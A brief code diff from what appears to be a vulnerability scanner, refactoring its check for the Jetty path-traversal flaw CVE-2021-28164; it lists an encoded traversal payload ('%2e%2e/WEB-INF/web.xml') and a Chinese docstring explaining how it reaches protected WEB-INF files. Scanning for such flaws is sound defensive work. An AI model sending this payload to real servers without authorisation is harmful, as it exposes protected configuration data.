@@ -6,14 +6,14 @@ cve_2021_28164_payloads = [
     {'path': '%2e%2e/WEB-INF/web.xml'},
 ]
 
-def cve_2021_28164_scan(self, clients):
+def cve_2021_28164_scan(clients):
     ''' 默认允许请求的url中包含%2e或者%2e%2e以访问 WEB-INF 目录中的受保护资源
         例如请求 /context/%2e/WEB-INF/web.xml可以检索 web.xml 文件
     '''
     hackClient = clients.get('hackClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Jetty',
         'vul_type': 'DSinfo',
         'vul_id': 'CVE-2021-28164',
     }
